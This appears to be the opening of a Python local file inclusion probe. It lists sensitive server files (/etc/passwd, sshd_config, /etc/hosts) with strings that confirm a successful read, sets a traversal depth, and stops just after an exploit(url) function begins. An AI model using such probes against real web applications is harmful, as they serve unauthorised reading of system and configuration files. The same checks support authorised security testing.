import  itertools
 


LFI_POCS={ '/etc/passwd' 		       : '/usr/sbin:',
					 '/etc/ssh/sshd_config'  : 'X11Forwarding',
					 '/etc/hosts'			       : 'localhost',
				 }
				 
LFI_DEPTH=6 
				 
def  exploit(url):
    if not url.params:
        return
	